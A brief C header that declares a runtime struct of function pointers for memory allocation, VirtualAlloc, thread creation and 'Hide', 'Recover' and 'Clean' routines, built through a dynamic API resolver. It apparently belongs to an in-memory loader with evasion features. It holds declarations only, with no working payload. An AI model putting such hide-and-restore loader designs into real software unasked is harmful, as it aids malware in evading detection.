#ifndef RUNTIME_H
#define RUNTIME_H

#include "go_types.h"
#include "windows_t.h"

typedef void* (*MemAlloc)(uint size);
typedef void  (*MemFree)(void* addr);

typedef void (*Hide)();
typedef void (*Recover)();
typedef void (*Clean)();

typedef struct {
    MemAlloc     MemAlloc;
    MemFree      MemFree;
    VirtualAlloc VirtualAlloc;
    VirtualFree  VirtualFree;
    CreateThread CreateThread;

    Hide    Hide;
    Recover Recover;
    Clean   Clean;
} RuntimeM;

RuntimeM* NewRuntime(FindAPI_t findAPI);

#endif // RUNTIME_H
